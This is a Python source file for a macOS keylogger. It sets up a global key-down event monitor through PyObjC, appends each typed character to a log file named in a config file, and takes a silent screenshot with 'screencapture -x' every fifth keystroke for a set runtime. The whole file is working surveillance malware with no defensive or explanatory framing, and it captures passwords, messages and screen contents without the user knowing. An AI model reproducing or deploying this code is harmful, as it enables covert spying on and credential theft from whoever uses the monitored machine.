#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
from AppKit import *
from Foundation import *
from Cocoa import *
from PyObjCTools import AppHelper
import time
import configparser

config = configparser.ConfigParser()
config.read('keylogger.cfg')
''' Global Parameters '''
output_filename = str(config['Output']['Filename'])
output_directory = str(config['Output']['OutputDirectoryFullPath'])
os.system('pwd > wd.txt')
wd = open('wd.txt', 'r+')
wd2 = wd.read()
wd2 = wd2.replace('\n', '')
wd2 = str(wd2)
wd.close()

os.system('rm wd.txt')

output_directory =  wd2 + output_directory
output_filepath = output_directory + '/' + output_filename
runtime = str(config['Options']['runtime'])
runtime = float(runtime)
t_end = time.time() + 60*runtime
count = 1


'''Just parses out the text of the NSEvent to write to text file'''
def parse_event(event_arg):
    e_string = str(event_arg)
    e_string = e_string.replace('chars=" "', 'chars=space')
    e_list = e_string.split(' ')
    e_dict = {}
    for item in e_list:
        if item != 'NSEvent:':
            temp = item.split('=')
            temp[1] = temp[1].replace('"','')
            temp[1] = temp[1].replace('space', ' ')
            e_dict[temp[0]] = temp[1]

    return e_dict

def keypress_handler(event):
    global count
    if time.time() >= t_end:
        AppHelper.stopEventLoop()

    if not os.path.exists(output_directory):
        os.makedirs(output_directory)
    try:
        if (count % 5 == 0):
            if not os.path.exists(output_directory + "/folder" + str(count/50)):
                os.makedirs(output_directory + "/folder" + str(count/50))
            os.system("screencapture -x " + output_directory + "/folder" + str(count/50) + "/screenshot" + str('%03d' % (count/5)) + ".png")
        count += 1
        event_dict = parse_event(event)
        f = open(output_filepath, "a+")
        f.write(event_dict['chars'])

    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

def main():
    NSApplication.sharedApplication()
    NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, keypress_handler)
    AppHelper.runEventLoop()

main()
